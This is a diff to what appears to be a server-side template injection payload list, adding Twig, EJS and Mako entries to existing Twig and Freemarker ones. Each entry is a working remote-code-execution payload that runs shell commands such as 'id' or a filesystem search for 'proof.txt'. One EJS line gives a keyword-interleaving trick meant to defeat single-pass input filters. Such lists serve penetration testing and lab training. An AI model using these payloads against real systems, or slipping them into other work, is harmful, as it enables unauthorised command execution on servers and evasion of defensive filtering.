@@ -18,7 +18,19 @@ ${{7*7}}       # mixed-bracket probe
 ## Twig (PHP)
 {{['id']|filter('system')}}
 {{['id']|map('system')|join}}
+{{[0]|reduce('system','id')}}                      # reduce-gadget: callback=system, arg=id (newer Twig)
 {{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+## EJS (Node.js)  — <%= 7*7 %> renders 49
+<%= process.mainModule.require("child_process").execSync("id").toString() %>
+<%= global.process.mainModule.require("child_process").execSync("id").toString() %>
+# if source strips the words process/require/exec ONCE, interleave so one pass leaves them intact:
+<%=global.proprocesscess.mainModule.requrequireire("child_proprocesscess").exexececSync("id").toString()%>
+
+## Mako (Python)  — ${7*7} renders 49
+${self.module.cache.util.os.popen("id").read()}
+${self.module.cache.util.os.system("id")}          # prints exit code only (0) — use popen().read() to see output
+${self.module.cache.util.os.popen("find / -type f -name 'proof.txt' 2>/dev/null").read()}
 
 ## Freemarker (Java)
 <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
